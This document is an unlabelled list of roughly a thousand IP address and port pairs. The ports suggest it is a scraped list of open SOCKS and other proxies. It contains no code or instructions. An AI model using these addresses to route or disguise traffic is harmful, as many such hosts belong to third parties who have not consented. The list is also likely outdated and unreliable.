170.81.35.26:33566
118.174.46.146:45764
188.175.191.162:4145
222.165.221.9:31523
132.255.110.195:4153
85.208.76.1:4153
181.211.11.78:33145
200.105.179.250:31247
139.5.29.97:36983
113.160.247.180:4145
202.134.166.1:4153
202.152.38.75:49420
200.33.152.207:47926
170.254.148.94:4153
157.25.197.74:1080
110.232.82.229:4153
186.235.184.194:4153
91.205.128.233:4145
116.212.131.174:36362
201.158.106.71:4145
222.129.39.38:57114
187.237.164.37:4153
203.77.239.201:4153
91.144.142.19:46138
177.67.162.42:4145
103.23.101.175:4153
5.17.89.13:4145
201.220.128.88:3000
180.171.128.26:4145
80.191.169.69:4145
45.118.115.130:1089
223.100.166.3:49247
190.121.142.158:4145
2.183.8.121:4153
46.150.23.93:58820
125.19.99.90:4145
45.114.68.94:4153
109.160.55.202:4145
177.72.115.161:31164
79.143.225.152:31270
103.247.216.17:5678
27.123.213.172:4145
102.177.161.1:4145
103.212.93.193:45639
103.12.151.6:37983
92.45.51.221:1080
187.188.17.134:4153
202.141.233.166:53124
170.0.203.14:1080
77.233.10.37:33683
89.218.5.109:50733
45.71.81.255:45337
41.206.35.222:5678
103.85.67.169:4145
193.109.42.117:4153
187.190.237.69:39835
103.113.106.227:4145
109.86.219.4:4145
79.124.62.26:443
77.70.35.87:57509
213.81.219.27:1080
212.34.239.253:1080
114.242.116.52:4145
191.6.93.191:4145
119.93.234.41:31622
190.90.140.55:50419
190.214.50.158:40637
200.108.205.182:4153
103.60.181.211:31248
103.111.22.65:58563
187.19.127.178:4145
124.41.240.177:52480
197.234.13.91:4145
95.19.50.60:4145
139.255.191.13:4153
1.20.220.79:4145
180.211.191.94:4153
213.81.182.29:57534
188.43.117.38:51307
177.44.175.198:4153
223.206.34.251:4153
186.250.20.13:4153
36.91.119.197:5678
103.115.119.254:30543
217.72.1.254:30357
88.255.102.22:1080
202.57.55.242:38268
117.158.64.100:1080
45.229.174.77:4145
187.84.191.50:4145
187.84.191.41:38392
103.10.54.81:4153
103.134.18.209:1080
50.195.7.180:64312
187.108.86.40:35376
200.140.44.245:4145
81.163.36.210:42967
129.126.99.254:4153
187.45.170.142:4153
176.241.94.228:10801
188.168.27.71:38071
119.82.252.122:47516
45.163.200.2:4145
103.211.8.225:52616
181.112.229.210:40704
83.136.179.91:4145
175.143.51.221:4145
212.156.86.130:4145
168.181.121.197:57010
202.62.37.187:4153
176.197.174.182:4145
92.242.255.11:31024
78.165.73.190:4153
179.106.150.7:59624
103.79.96.165:4153
62.122.201.246:50129
79.106.35.20:1080
212.107.233.222:3629
177.21.19.87:3629
154.73.85.149:57932
88.255.102.114:1082
183.81.154.58:4145
132.255.94.2:31337
141.98.51.70:1080
103.112.60.33:44550
202.79.40.97:36953
217.21.60.36:1080
46.188.82.11:54136
154.117.155.42:52428
190.53.46.2:45580
202.124.46.101:4145
46.63.81.195:4145
181.13.198.90:4153
182.16.171.65:51459
77.48.137.3:50523
187.111.193.85:44681
115.124.86.250:5678
177.105.68.172:4153
63.151.9.74:64312
202.91.177.65:4145
103.78.25.206:8291
119.42.67.50:4145
101.109.41.137:4153
210.246.240.42:14153
193.239.101.6:4145
66.135.227.178:4145
77.232.167.200:31293
85.62.101.113:1080
85.21.200.26:4153
179.27.86.36:4153
82.207.41.135:54870
82.137.250.157:1099
92.255.185.6:4145
109.201.96.222:4145
118.174.232.128:53505
113.11.39.110:4153
181.113.135.214:57101
45.112.57.230:47509
103.57.80.68:4145
43.225.151.198:4153
101.51.141.17:4153
45.169.98.242:4153
116.254.100.165:50536
201.33.170.25:31337
103.105.40.70:4145
203.209.190.202:4153
113.160.247.115:4145
186.225.194.78:34110
195.136.10.253:1080
184.105.133.1:48324
114.242.116.57:4145
195.211.30.115:60507
103.10.56.190:4153
103.52.209.41:1080
185.17.134.149:61535
46.39.29.4:3629
46.100.74.74:4153
36.89.187.193:44587
88.255.217.115:1080
82.99.232.18:39999
118.175.93.25:52026
112.66.72.81:4145
36.89.149.173:4145
88.87.74.87:4145
189.1.26.17:4153
177.137.168.159:4145
181.48.70.30:4153
119.82.252.106:40782
178.143.12.103:4153
36.89.94.139:43028
185.169.181.23:4145
110.78.164.188:4153
121.13.252.61:61401
118.173.233.149:42500
202.168.146.109:1080
167.250.160.206:4153
91.206.148.243:59175
80.89.150.134:3629
201.184.130.194:35943
103.36.9.7:4145
80.106.59.35:4153
1.1.167.218:4145
188.225.202.1:59311
156.38.29.74:1080
36.89.156.211:4145
88.135.42.145:4145
223.165.243.161:47205
170.210.4.222:38432
182.93.84.136:60312
93.87.75.118:47505
103.84.134.1:1080
208.113.152.12:32690
182.52.51.10:35719
181.196.181.146:4145
89.251.144.37:30048
196.28.234.66:1080
98.172.142.6:64312
131.161.65.47:4153
103.57.80.156:4145
185.43.249.148:39316
186.147.235.6:4153
137.74.64.237:1080
103.28.114.94:1080
103.199.97.17:39825
213.96.16.193:4145
200.225.140.130:36564
202.51.111.217:5430
187.103.75.245:4145
213.138.77.238:4145
31.43.33.56:4153
102.176.179.26:4153
118.181.226.166:38130
81.177.73.10:4153
45.112.1.169:4145
154.79.254.170:10801
36.95.24.169:5678
203.189.156.47:4153
117.141.96.35:4145
103.79.96.181:4153
46.29.116.6:4145
220.132.86.14:4145
91.247.250.215:4145
185.162.141.236:50579
181.129.74.58:30431
80.73.87.202:4153
103.123.170.191:8291
41.223.108.13:1080
103.94.7.250:4145
85.30.248.210:4153
131.161.35.20:44550
103.102.141.56:4145
186.46.6.233:52854
182.134.157.200:57114
110.74.195.64:32744
200.218.242.85:4153
103.208.200.222:41151
5.83.104.153:4153
37.57.37.213:1080
119.2.7.97:4145
88.247.165.215:41165
80.92.181.3:44550
103.74.120.89:4145
187.19.205.226:4145
78.8.189.242:52036
103.135.174.132:1080
95.65.124.252:50748
143.255.52.198:59616
59.153.121.182:1080
174.93.149.68:4153
189.80.219.59:4145
200.5.203.58:56142
103.109.182.193:47749
103.194.192.29:51289
202.151.163.10:1080
88.199.82.114:54194
168.121.139.31:4145
5.2.200.203:1080
187.216.81.185:37640
103.225.228.21:31094
103.70.206.193:59311
170.79.181.118:4153
103.106.219.222:4145
89.249.244.111:4145
91.216.66.70:47658
217.21.124.194:4145
165.16.105.186:5678
103.31.157.206:4145
181.113.135.254:50083
36.37.139.2:59296
186.225.45.13:45239
103.112.62.149:44550
185.122.44.218:43153
134.249.113.100:1080
209.16.78.27:54321
8.9.36.10:1080
178.168.120.136:4153
79.106.35.223:1080
45.6.92.131:4153
186.219.210.86:44410
109.104.164.105:1080
186.42.174.218:3629
103.10.59.73:4145
183.87.69.233:36185
103.138.212.242:31016
84.236.158.242:9999
89.132.207.82:4145
185.20.90.50:10801
50.242.122.141:32100
118.175.93.148:59403
124.109.33.176:4153
117.242.147.73:46152
36.66.192.35:38420
50.207.130.238:54321
31.210.225.135:4153
43.252.107.54:4145
132.255.44.48:4153
177.105.68.220:4153
36.67.174.77:4153
87.248.171.235:4145
61.148.199.206:4145
200.165.165.6:4153
186.215.202.34:4145
36.89.183.253:56739
109.102.254.170:4145
186.207.131.216:44550
41.75.113.217:1080
190.7.155.43:4153
103.87.169.180:1088
196.15.247.74:4153
218.81.50.59:4145
45.116.2.17:4145
189.198.210.234:4153
46.227.37.157:1088
152.32.78.24:4145
95.80.85.33:1080
185.169.181.24:4145
109.245.239.125:43125
103.242.125.243:4145
95.107.199.90:4145
78.133.186.129:4153
80.89.137.214:4145
50.250.56.129:48380
101.132.36.83:3129
177.154.55.114:51815
109.245.241.89:4145
212.42.99.22:4145
94.136.157.81:60030
122.116.122.6:4145
203.77.240.76:4145
123.207.94.24:1080
105.247.148.210:37159
93.61.50.221:4153
201.219.217.70:31337
185.152.12.49:54680
88.255.106.27:1080
180.167.201.241:4145
118.174.46.144:45764
218.21.96.128:51080
213.222.34.200:4145
185.37.89.7:3629
1.0.133.100:51327
189.45.172.74:4153
181.41.241.239:4145
217.145.199.45:56746
14.115.106.190:3629
197.231.196.44:37765
81.18.49.5:1080
81.214.137.255:4153
197.232.21.22:58253
110.77.232.153:4145
183.81.154.59:4145
78.92.254.169:53718
121.13.252.58:61401
186.46.187.26:43076
36.94.35.217:32016
103.69.20.43:4145
202.144.201.193:43870
185.43.8.43:54125
165.90.60.69:4145
104.248.48.176:30588
200.48.13.26:4153
81.163.254.104:3629
195.248.242.249:1080
94.76.92.10:4145
95.0.206.62:1082
177.86.64.253:3629
8.210.163.246:50032
45.117.31.137:4145
177.85.200.45:35933
182.52.238.111:56382
80.191.169.66:4145
189.91.84.25:43907
187.111.195.0:60988
45.5.119.86:4153
94.236.153.194:4145
31.28.241.117:4145
5.182.26.129:4145
1.10.189.156:51336
149.56.1.48:8181
78.8.189.147:52036
181.196.246.246:4145
84.51.56.123:4145
189.91.100.50:43573
45.7.177.176:39867
138.68.73.161:1080
103.106.32.234:31110
91.201.240.101:3629
51.254.182.63:44241
78.38.122.249:4153
58.211.134.98:47442
116.0.37.130:61992
122.50.5.98:4153
123.16.188.2:60153
200.68.13.26:46903
36.84.100.230:34432
188.190.101.143:4145
45.5.209.12:4145
103.12.246.49:4145
94.253.15.25:60270
46.188.82.63:4153
181.209.74.234:4153
213.6.66.66:57391
188.19.64.122:4145
125.26.99.228:44052
83.136.176.64:4145
202.129.52.172:4153
192.139.192.90:4153
188.26.5.254:4145
103.110.109.17:1080
202.168.146.99:1080
95.0.217.19:1080
222.129.38.180:57114
165.16.54.199:31618
177.73.248.26:55290
218.21.78.35:4145
194.85.124.150:4153
85.159.6.20:3629
213.217.241.101:4145
200.218.242.145:4153
186.1.182.194:4153
46.8.33.180:4153
85.196.136.21:4153
118.174.234.21:38471
110.78.164.234:4153
103.60.138.65:4153
217.15.195.141:33955
181.112.57.2:45201
121.205.216.101:1080
210.245.51.33:4145
213.80.166.5:38442
80.79.66.82:3629
93.158.228.230:31065
150.107.205.20:54714
103.102.14.185:1080
186.251.208.148:10801
110.74.222.159:61274
62.99.178.46:43636
194.44.243.186:45529
187.103.232.26:4153
83.171.98.129:49901
37.57.50.130:4145
62.73.127.98:10801
41.86.56.224:41833
46.44.16.54:3629
82.147.44.130:4153
94.159.6.254:4153
5.102.58.41:5678
80.71.112.100:55243
203.223.44.102:53945
109.105.205.230:4145
36.89.229.97:50540
51.254.182.54:1000
43.224.10.13:6667
200.108.196.108:4145
190.145.255.246:4145
41.76.242.14:5678
178.158.23.244:4145
192.81.225.233:4153
85.128.16.46:1080
138.97.236.2:1080
103.133.82.125:4153
43.255.217.186:48326
36.89.143.21:53541
116.199.170.65:4145
45.234.148.1:4153
194.44.20.22:1080
5.153.140.180:4145
213.16.99.222:4145
27.50.22.30:4145
121.205.218.107:1080
129.126.65.78:4153
78.154.180.12:1080
202.57.132.77:4145
188.170.189.26:4145
186.211.8.1:35852
103.225.89.54:4153
46.253.39.142:57136
131.161.68.41:35944
177.21.30.32:4145
144.136.211.198:4153
138.255.227.9:4153
77.234.235.174:4153
169.239.223.136:52178
195.228.133.203:4153
202.146.245.156:44550
177.66.247.81:4145
45.70.0.17:50387
203.114.124.203:4145
114.89.83.28:4145
27.123.255.82:47094
184.185.2.244:4145
85.109.58.222:1080
45.6.229.227:4145
189.201.188.125:4145
213.14.25.65:1080
213.228.147.6:4153
103.25.122.41:44550
1.20.100.45:43943
191.98.192.145:4145
185.255.47.206:5678
138.99.93.224:4145
175.41.45.129:34432
85.228.41.27:4153
103.23.101.30:4145
103.92.212.242:52658
187.111.192.221:37498
103.114.97.74:1080
195.58.19.193:1080
176.104.176.188:1080
185.77.169.26:4153
50.250.34.229:53412
202.182.59.188:1089
103.69.20.38:4145
41.217.242.11:47599
80.82.147.1:4153
89.231.32.193:4145
213.14.31.122:35314
185.169.181.17:4145
201.184.154.98:4153
181.129.52.156:44665
87.103.174.147:3629
221.1.200.242:43142
79.134.7.134:49230
91.232.135.105:80
168.196.115.193:4153
103.199.157.81:41610
103.90.74.242:4153
89.17.51.234:3629
186.211.187.50:4153
176.10.45.206:1080
50.244.116.145:54321
2.50.18.118:4145
168.228.51.197:41037
158.58.197.227:50128
200.199.8.118:35938
186.211.199.118:4145
191.103.254.145:52973
79.106.165.30:50194
185.61.94.65:43110
77.37.131.73:4145
194.228.129.189:56211
59.153.121.162:1080
103.79.96.154:4153
103.112.61.241:44550
177.69.19.49:4145
216.154.201.132:54321
50.235.92.14:32100
82.147.153.2:4153
91.203.224.177:43820
36.89.122.240:56936
123.108.252.170:51403
103.83.174.95:4145
103.133.37.77:4153
41.169.70.219:31255
45.64.122.210:46458
60.12.214.184:46849
176.56.107.171:46064
138.0.102.246:31533
58.252.219.12:11337
170.246.85.107:37163
45.6.15.79:4145
103.85.106.110:4153
115.124.86.147:5678
182.53.200.46:4153
85.117.56.103:4145
157.119.50.70:1080
222.165.194.68:50486
185.55.2.214:1080
31.10.110.132:4145
101.255.125.57:4145
188.166.34.137:9000
36.66.172.121:37552
218.81.151.107:4145
185.21.39.46:58351
203.205.35.201:4145
200.69.136.235:4145
45.65.131.128:4145
176.235.164.177:40276
190.215.117.69:4153
202.58.108.49:36819
5.189.130.21:1080
185.12.20.205:1080
103.76.190.81:4153
85.185.152.146:4145
43.224.10.44:6667
103.105.236.120:53977
190.131.247.30:4153
84.221.212.22:4145
50.237.206.138:64312
88.116.29.106:1081
186.0.239.225:3629
92.242.254.12:38890
103.251.223.13:4145
36.255.104.1:1080
109.72.97.66:4145
103.75.148.203:4145
177.91.44.99:4153
88.135.44.252:4153
217.169.211.50:4153
82.135.174.3:8080
51.11.240.222:8085
91.237.161.211:56889
169.255.75.117:47650
86.34.157.3:4145
103.110.109.65:1080
131.108.118.103:4145
110.93.13.215:5678
188.133.160.22:4145
5.83.104.148:4153
91.203.25.28:4153
185.123.194.28:3629
202.158.49.142:39172
103.104.215.234:5678
103.23.101.97:4145
200.108.198.205:4153
177.86.64.241:3629
89.237.35.10:51549
200.41.182.243:4145
182.253.192.186:46634
195.29.155.98:58617
70.82.75.118:4153
192.111.139.162:4145
202.91.89.129:4153
184.105.134.166:48324
195.244.36.206:4153
41.33.66.229:1080
182.253.16.171:4145
201.148.126.202:4145
61.141.21.34:1080
178.134.198.90:4153
170.81.34.54:4153
220.169.127.172:49765
80.68.76.178:4153
103.36.11.174:4145
36.90.3.150:4145
177.92.9.10:4145
183.88.253.18:4153
86.125.112.230:30897
37.17.168.163:61865
94.66.86.165:4145
113.160.58.230:4145
109.104.212.25:4153
113.176.88.10:45587
189.51.143.10:4153
103.95.98.90:4153
116.239.27.130:4145
24.172.34.114:60133
36.89.193.169:48043
180.211.141.158:4153
82.209.216.156:1080
196.192.181.235:4153
83.97.106.21:4145
125.16.134.218:8291
190.7.180.225:30225
111.92.240.134:45441
90.183.101.238:47009
190.85.184.114:4153
84.54.132.0:4145
186.225.250.26:53084
36.67.51.186:31212
101.228.77.198:4145
41.76.157.202:8291
80.53.244.214:35098
103.226.143.86:1080
103.102.142.184:4145
41.169.152.154:4153
1.179.180.98:4145
103.205.130.59:4145
187.60.41.252:4145
94.74.68.72:4153
81.2.47.181:4145
180.180.175.37:4145
45.226.48.54:34739
187.44.110.157:4145
187.33.91.85:4153
202.136.88.68:1080
190.217.1.101:55170
103.104.185.102:5678
37.98.231.2:1080
176.235.99.12:5678
111.90.187.94:14888
37.252.64.48:38571
89.207.93.238:9000
160.202.42.132:36917
187.189.81.144:4153
190.90.20.230:1080
67.204.21.17:64312
119.42.123.215:4145
196.44.182.74:1080
202.57.33.134:4145
52.144.86.82:1080
89.218.169.122:4153
186.159.3.41:51445
202.52.248.254:52094
91.205.241.86:3629
14.63.1.108:4145
201.139.124.30:1080
81.89.69.37:4153
80.71.112.114:55243
124.41.240.66:59534
189.14.194.113:4145
103.91.128.182:4153
202.191.126.100:4153
168.119.37.152:10243
202.191.15.253:4145
103.105.236.153:53977
210.245.51.76:4145
170.239.252.250:4145
200.81.144.33:1080
123.108.201.133:35614
109.245.214.49:59278
202.55.175.237:1080
91.82.41.200:10801
103.15.83.74:30023
185.139.56.133:4145
103.106.32.217:31110
80.91.118.61:1080
177.91.44.101:4153
109.69.0.69:1080
191.7.208.101:31576
197.248.190.170:58496
154.120.133.190:30303
85.113.140.196:3629
116.68.162.105:1080
103.18.77.46:4145
83.211.162.198:4145
180.250.170.210:40108
82.103.70.227:4145
222.165.223.140:41541
94.182.53.2:4153
190.152.71.46:4153
85.90.163.235:4153
37.75.135.161:37278
103.220.206.122:1080
217.145.199.112:56284
197.232.47.102:52567
41.242.70.5:4145
36.66.98.233:52851
177.124.225.106:4145
103.53.76.82:1089
197.221.158.186:1080
117.28.254.143:4145
179.107.58.124:4145
185.241.102.1:4145
78.9.110.94:1080
103.114.0.3:4153
203.215.181.218:36342
212.49.69.67:5678
80.71.112.107:55243
177.105.68.177:4153
218.108.31.28:4145
109.73.180.67:5678
60.217.64.237:35292
195.149.98.211:8181
195.98.187.162:3629
41.77.23.120:5678
104.255.170.67:58890
103.76.253.66:3129
129.146.216.187:20000
91.210.176.104:1088
93.113.101.85:5678
125.133.48.40:5678
189.220.227.6:5678
91.250.61.113:3629
45.70.238.88:4153
109.195.115.150:1080
103.164.107.110:5678
187.95.136.14:5678
92.187.228.47:4145
124.158.160.179:5678
201.184.230.34:5678
167.99.62.42:42688
200.118.122.6:4153
104.168.12.190:5555
20.105.253.176:8080
91.218.173.110:5678
2.136.195.109:5678
140.246.148.243:8888
46.101.235.163:14811
168.232.60.242:5678
112.78.170.251:5678
103.216.82.37:6667
107.172.79.116:43594
188.72.51.34:5678
45.227.115.181:5678
46.214.93.158:5678
190.146.60.76:5678
103.164.107.66:5678
103.153.35.73:5678
202.169.229.139:53281
124.70.46.14:3128
213.74.191.38:1080
168.121.56.6:14880
45.7.177.183:39867
220.174.210.128:4145
195.34.242.131:4145
150.109.148.234:1234
213.16.81.182:35559
195.24.61.7:51544
118.97.164.19:8080
1.180.156.226:65001
45.7.177.192:39867
58.215.218.170:10800
212.200.118.254:4153
47.112.216.65:18181
103.197.206.176:5678
212.225.240.54:3629
46.188.2.42:5678
46.225.251.206:1080
92.42.109.187:1080
177.136.124.48:3629
103.246.2.202:5678
45.71.100.92:5678
67.204.131.163:3629
1.55.241.4:4145
186.87.179.54:5678
89.250.149.114:60981
178.213.133.231:5678
137.220.176.235:8080
103.115.116.17:30543
166.62.32.44:8181
193.242.151.45:8080
103.73.74.183:1080
43.155.92.192:59394
103.95.48.73:4145
103.255.241.190:55443
92.51.201.65:4145
149.248.60.214:14000
137.184.57.65:9050
103.53.76.84:8080
141.105.86.130:44660
39.96.175.55:1080
43.135.74.226:38081
36.133.183.241:81
213.145.137.102:37447
198.199.64.196:61877
5.178.193.43:1080
59.152.104.138:32075
198.199.109.36:56012
113.11.136.131:5678
27.72.145.249:34432
103.80.83.48:3127
213.230.109.175:5678
103.134.184.134:5430
80.242.101.100:3629
177.66.195.118:4145
185.171.54.30:4153
88.204.247.214:4145
195.175.73.214:5678
78.155.85.67:4153
117.239.29.115:3128
101.51.141.11:4153
138.68.155.34:55800
103.241.108.206:3629
64.89.249.1:47124
85.25.195.177:5577
103.144.161.104:8291
176.100.115.172:4153
5.16.10.213:5678
171.237.205.83:1080
186.147.254.122:5678
27.74.10.157:5004
197.254.97.248:80
43.242.242.140:5678
103.195.6.194:43256
8.42.70.4:39593
163.53.205.225:4153
119.81.189.194:8123
109.201.9.99:8080
196.219.202.74:8080
59.91.122.57:44550
103.59.190.2:56252
36.95.189.165:5678
203.150.136.34:3629
181.48.63.206:4153
116.68.240.225:4153
36.67.93.158:80
119.82.242.59:4145
193.84.184.25:5678
85.172.38.210:3629
124.105.55.176:30906
111.21.182.238:5678
95.80.182.76:5678
117.102.75.210:808
77.242.235.33:4153
186.86.137.96:5678
186.183.220.2:8080
134.0.63.134:1723
101.71.154.251:1080
117.54.201.92:5678
110.164.156.114:5678
94.66.82.183:4145
169.57.157.148:80
103.108.182.5:31080
219.87.191.203:80
177.131.29.210:4153
164.163.21.10:4153
45.251.231.213:5678
114.93.190.61:7891
163.53.210.13:5678
190.210.93.15:5678
178.132.4.53:443
177.12.177.241:4153
103.84.39.94:30740
110.50.84.231:46236
109.167.113.12:4153
36.255.61.190:4145
118.179.173.253:5678
163.53.186.250:5678
182.23.5.70:5678
200.46.191.130:5678
175.101.18.25:5678
192.154.247.182:8000
206.126.57.190:5678
201.236.248.250:5678
85.248.57.129:4153
186.113.30.22:61618
8.218.213.95:10809
103.111.137.67:5678
103.169.130.28:5678
186.126.57.33:1080
180.168.141.242:1080
37.57.38.133:10801
45.41.65.54:54041
71.12.177.11:5678
186.67.26.181:999
51.83.190.248:19050
203.76.117.74:4153
36.94.142.165:8080
213.97.98.89:4153
131.196.180.1:4153
2.139.162.80:4145
186.103.143.210:4153
45.161.115.145:999
202.62.39.177:5678
58.97.194.199:5678
212.3.168.159:11080
188.134.9.40:1080
117.102.119.150:32302
188.251.243.48:5678
43.224.10.42:6667
138.68.51.109:9050
129.18.192.234:5678
103.134.241.125:5678
109.167.12.10:5678
154.79.248.156:5678
201.143.32.82:4153
182.71.146.148:5678
154.72.65.138:4145
43.224.8.116:6666
192.241.135.228:9050
5.160.101.170:3128
45.249.78.193:3629
87.236.210.74:443
129.146.18.152:20000
50.113.74.1:32100
213.6.36.146:5678
190.120.254.52:4145
124.107.231.80:1080
8.136.137.129:8877
189.89.168.133:4145
45.118.33.47:5678
54.39.87.232:39721
202.40.188.94:55103
200.25.254.193:54240
45.185.236.254:8989
185.255.47.48:4145
115.87.99.120:8080
91.186.102.169:1080
112.6.117.135:8085
185.56.251.16:5678
187.44.1.248:5678
60.2.44.182:34659
185.151.27.225:8081
88.220.66.202:5678
45.170.101.2:999
173.212.240.33:56304
168.196.211.10:55443
103.214.156.225:5678
89.171.116.65:65000
103.122.98.242:4153
203.99.116.100:5678
190.53.46.11:45535
189.127.229.92:8080
122.248.197.121:9050
27.131.182.50:5678
193.29.187.226:9050
192.241.211.29:43551
212.46.255.78:8080
159.8.114.37:80
112.220.151.204:4145
194.28.56.180:3629
103.240.168.138:6667
152.171.242.96:1080
188.246.239.42:5678
111.172.65.190:1081
5.160.184.243:4145
95.216.181.107:9070
103.5.127.132:5678
154.236.184.70:1981
190.188.244.23:5678
170.106.152.12:21127
46.238.230.4:8080
120.71.148.202:8901
176.119.159.63:1080
143.255.52.102:53043
94.240.8.147:5678
103.164.107.82:5678
41.60.216.169:5678
102.66.141.207:5678
159.65.69.186:9300
181.229.22.144:5678
103.8.115.27:48644
103.156.248.31:1080
36.89.229.97:59707
89.189.128.183:8080
45.81.225.67:7059
47.88.7.115:3129
113.162.84.219:1080
1.83.154.35:4145
1.4.198.9:4153
101.53.158.48:9600
82.200.81.4:1080
181.164.9.131:4145
70.127.78.92:5678
202.158.166.83:1080
176.104.1.174:7777
185.49.170.20:33626
213.91.128.99:10801
46.101.5.73:48528
115.243.42.241:1080
177.36.186.130:5678
8.136.136.142:8877
164.163.21.14:8291
213.6.68.210:4145
43.231.21.176:4153
166.62.83.60:48127
103.122.108.44:5678
120.150.145.111:4153
1.32.59.217:31981
157.119.222.186:4145
91.206.92.92:80
103.164.113.26:5678
39.99.54.91:80
201.184.238.106:5678
89.21.77.145:5678
186.4.125.7:5678
190.93.221.93:5678
191.241.145.111:4153
1.179.186.71:1080
194.44.20.112:5678
79.133.202.7:1088
189.50.111.105:3629
101.132.105.84:8080
196.41.102.130:60216
165.22.214.24:28704
120.79.173.225:50000
201.217.55.97:43110
182.66.101.133:3128
185.97.122.253:4153
103.78.54.10:4153
45.236.185.1:4153
41.160.238.106:5678
89.111.133.217:9050
212.225.227.97:4153
196.3.97.71:23500
31.41.84.40:1099
103.100.14.255:4153
103.168.123.90:5678
191.243.72.34:4145
46.227.162.98:33802
103.215.24.162:5678
188.255.244.5:1080
201.91.82.155:3128
177.93.33.246:999
124.121.126.14:8213
82.157.146.116:10002
194.87.102.102:1111
142.93.143.155:9010
154.72.183.230:5678
77.46.138.153:33608
103.9.114.194:39204
88.119.128.181:4145
202.166.196.28:47470
202.165.33.97:5678
208.180.199.147:5678
120.78.202.4:6111
170.254.224.7:55443
91.223.224.242:41737
181.101.38.151:1080
104.168.214.225:26047
180.211.193.102:5678
190.119.168.117:5678
111.46.160.141:1080
13.233.10.152:9050
192.141.232.12:33998
36.133.202.102:81
103.171.245.14:11337
14.207.81.4:4153
190.122.60.79:4145
169.57.157.148:8123
181.174.130.165:5678
91.213.119.246:46024
103.92.114.2:8080
79.106.246.174:4145
103.111.219.138:4145
200.241.228.226:4153
89.23.193.189:4153
36.91.190.61:5678
117.252.216.82:5678
133.167.121.133:1976
118.174.209.102:4145
123.200.9.30:5678
103.122.84.28:5678
200.10.73.210:5678
52.119.124.138:5678
109.74.10.39:10123
122.152.50.14:5678
168.227.147.194:5678
94.153.209.22:3629
220.135.2.247:59171
186.208.65.114:4153
179.43.140.131:9050
200.69.70.56:5678
101.100.201.223:9050
190.4.0.246:53916
87.126.64.193:4145
34.138.225.120:8888
79.106.165.238:39983
182.93.80.3:8291
123.200.22.234:4153
84.21.109.149:1080
91.122.193.80:4145
102.219.43.39:5678
177.93.72.133:4153
45.182.115.30:4153
102.219.33.98:1080
163.172.75.81:5566
159.8.114.37:8123
85.25.91.141:5577
177.129.129.122:5678
91.221.17.220:8000
95.57.214.38:5678
178.253.204.206:1080
124.158.160.178:5678
103.75.184.126:38556
102.66.233.30:5678
177.19.152.170:5678
95.71.125.50:60867
186.10.127.170:4153
88.255.102.20:1080
181.57.194.28:5678
190.180.35.146:5678
160.202.40.138:5678
89.41.106.8:4145
103.133.26.45:5678
202.51.178.57:5678
117.102.82.44:4145
131.72.69.98:45005
109.125.128.71:5678
134.17.27.208:9080
31.209.105.238:4145
186.251.255.93:31337
150.129.151.83:6667
103.250.157.43:6667
189.38.3.22:4153
213.32.120.143:8080
198.89.91.198:5678
119.40.83.138:8080
45.112.127.106:4145
103.145.45.57:55443
187.95.82.53:3629
152.231.25.194:60080
141.0.181.67:5678
93.105.171.113:4153
27.116.51.85:6667
159.224.243.185:37793
159.192.97.156:4145
85.25.198.20:5577
152.231.27.33:60080
103.61.198.122:4145
58.251.94.56:6666
103.24.21.1:5678
80.254.104.8:4145
129.154.54.92:9999
119.148.103.4:4153
194.180.174.81:10523
178.189.11.134:61039
5.83.104.160:4153
41.216.68.254:5678
178.212.54.137:5678
140.246.33.39:8888
200.111.199.18:5678
189.2.127.244:4153
45.166.246.3:4153
34.146.157.204:9090
82.99.232.18:58689
81.162.199.65:4153
128.199.205.203:54767
50.63.13.221:19225
190.182.229.11:5678
113.111.44.58:7891
103.11.135.77:1080
41.190.233.61:36926
119.15.89.87:5678
202.169.49.218:5678
85.25.100.47:5577
41.75.212.186:5678
110.232.255.157:5678
185.177.125.28:9051
170.80.76.70:5678
222.92.207.98:40086
41.174.110.68:1080
85.25.91.161:5577
110.232.67.43:55443
36.66.8.55:5678
187.94.211.60:2580
202.162.232.31:80
45.179.164.9:80
177.36.221.13:4145
91.205.72.103:12346
139.5.151.179:63123
77.73.90.196:1337
203.76.112.68:5678
93.78.254.219:5678
78.140.195.66:3629
37.26.136.175:3629
122.116.124.83:5678
197.232.82.243:41890
131.161.177.62:5678
180.250.159.49:4153
197.246.171.18:3030
186.97.238.11:4153
47.103.110.210:8080
167.99.239.113:47430
222.165.215.117:52667
152.200.161.142:5678
181.204.2.242:5678
41.174.184.222:5678
112.78.175.140:5678
117.102.116.252:1080
109.120.247.47:5678
103.134.239.210:5678
181.78.24.26:5678
67.201.33.9:25280
36.95.133.234:1080
213.134.211.158:3128
202.133.6.69:4153
119.82.239.37:8080
178.252.197.64:4153
200.111.182.6:443
164.70.118.39:3128
45.7.177.239:39867
177.86.64.93:3629
92.242.221.236:5678
45.182.115.14:4153
93.100.113.99:8080
188.75.186.152:4145
20.210.80.237:1080
200.0.247.243:5678
103.51.44.5:4145
216.105.151.190:39593
123.203.156.224:65528
74.94.219.213:5678
85.113.20.234:5678
115.69.214.66:5678
190.24.86.206:4145
103.132.124.18:5678
216.245.192.130:15268
190.3.35.41:5678
103.130.112.129:5678
212.200.39.210:8080
43.225.187.197:5678
114.69.243.81:4145
27.72.145.184:5678
176.241.82.149:5678
49.70.13.237:7082
94.244.28.246:31280
94.228.17.2:5678
186.219.96.47:54570
123.231.221.242:6969
115.243.111.42:1088
81.134.144.161:1099
178.250.70.218:1088
167.249.170.26:4145
128.199.213.193:9050
61.7.195.206:44594
46.29.118.215:4153
103.76.15.202:5678
103.236.161.21:5430
203.142.64.90:1080
113.176.195.145:4153
125.141.139.198:5566
81.163.53.118:41258
47.57.188.208:80
186.159.3.43:51445
175.139.201.193:4153
82.207.101.191:4145
202.124.43.248:4145
192.99.7.189:33118
182.160.126.246:10801
181.198.111.123:5678
113.160.219.210:4145
46.225.225.194:4145
179.189.219.98:4145
154.74.140.214:5678
41.190.233.30:10801
58.84.31.62:5678
195.138.73.54:44017
165.227.178.3:20911
91.202.240.208:51678
182.52.236.134:8080
61.142.72.150:33235
88.135.210.179:8080
196.3.97.71:5678
137.184.7.136:9000
103.78.73.90:3128
68.188.63.149:8080
187.86.153.254:30660
103.134.214.130:1648
116.58.239.43:4153
112.222.61.180:4145
125.141.139.112:5566
103.109.2.76:8080
101.33.117.230:40532
116.118.98.4:5678
119.28.46.243:60080
113.160.227.166:5678
132.255.109.230:4153
122.9.162.243:1080
103.199.159.209:41610
65.214.140.53:39593
118.174.47.182:4145
177.87.230.29:43573
193.200.151.69:48241
103.161.164.105:8181
190.211.115.66:32298
40.71.120.23:8080
192.169.139.161:8975
185.66.59.206:42647
5.180.100.24:5678
148.251.249.251:80
125.141.133.53:5566
176.58.17.1:4153
103.73.74.176:1080
